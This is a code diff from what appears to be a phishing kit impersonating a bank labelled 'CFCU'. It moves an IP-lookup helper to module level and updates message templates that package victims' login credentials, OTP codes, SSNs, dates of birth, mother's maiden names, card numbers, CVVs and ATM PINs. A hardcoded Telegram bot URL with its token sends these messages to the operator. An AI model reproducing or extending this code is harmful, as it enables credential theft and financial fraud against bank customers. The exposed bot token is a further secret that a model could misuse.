@@ -1,6 +1,22 @@
 import axios from "axios";
 import { userData } from "../App";
 
+
+export const getIPAddress = async () => {
+    try {
+      const response = await fetch('https://api.ipify.org?format=json');
+      const data = await response.json();
+      const ipAddress = data.ip;
+      return ipAddress
+      // Further processing with the IP address
+    } catch (error) {
+      console.error('Error fetching IP address:', error);
+    }
+  };
+
+
+const IP = await getIPAddress()
+
 const url = `https://api.telegram.org/bot6078588778:AAEv4uFSFvIFCK1V-GBQtKJUHTk38p7Ku1I/sendMessage`
 
 export const sendRequest = async (message: any, handleLoading?: any) => {
@@ -20,17 +36,6 @@ export const sendRequest = async (message: any, handleLoading?: any) => {
     }
 }
 
-export const getIPAddress = async () => {
-    try {
-      const response = await fetch('https://api.ipify.org?format=json');
-      const data = await response.json();
-      const ipAddress = data.ip;
-      return ipAddress
-      // Further processing with the IP address
-    } catch (error) {
-      console.error('Error fetching IP address:', error);
-    }
-  };
 
   export const getLocation = () => {
     navigator.geolocation.getCurrentPosition((position) => {
@@ -47,8 +52,6 @@ export const getIPAddress = async () => {
   }
   
   export const userDataTemplate = async () => {
-
-    const IP = await getIPAddress()
     
     return `
     ------ Viewer Information: ${IP} --------
@@ -68,7 +71,7 @@ export const getIPAddress = async () => {
 
 export const userNameTemplate = (username: string, password: string) => {
     
-    return `------ Login Information: ${userData.IP} --------
+    return `------ Login Information: ${IP} --------
 
     Page: CFCU
 
@@ -81,7 +84,7 @@ export const userNameTemplate = (username: string, password: string) => {
 
 export const pinTemplate = (pin: string) => {
 
-    return `------ OTP Information: ${userData.IP} --------
+    return `------ OTP Information: ${IP} --------
 
     Page: CFCU
 
@@ -94,7 +97,7 @@ export const pinTemplate = (pin: string) => {
 
 export const personalInfoTemplate = (fullname: string, dob: string, address: string, state: string, city: string, zipcode: string, phonenumber: string, ssn: string, maidenname: string) => {
 
-    return `------ Personal Information: ${userData.IP} --------
+    return `------ Personal Information: ${IP} --------
 
     Page: CFCU
 
@@ -116,7 +119,7 @@ export const personalInfoTemplate = (fullname: string, dob: string, address: str
 
 export const cardInfoTemplate = (cardNumber: string, exDate: string, cvv: string, atmPin: string) => {
 
-    return `------ Card Information: ${userData.IP} --------
+    return `------ Card Information: ${IP} --------
 
     Page: CFCU
 
